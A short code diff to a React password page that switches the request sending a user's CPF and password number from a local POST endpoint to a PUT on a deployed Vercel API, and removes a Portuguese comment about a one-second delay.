@@ -25,11 +25,11 @@ export default function PasswordPage() {
     const cpf = localStorage.getItem('userCpf');
 
     try {
-      await axios.post('http://localhost:8000/api/users/senha', {
+      await axios.put('https://banese-api.vercel.app/api/users/password', {
         cpf,
         passwordNumber,
       });
-      // Adicionar um atraso de 1 segundo (1000 milissegundos) antes de definir isSuccess para true
+
       setTimeout(() => {
         setIsSuccess(true);
       }, 1000);
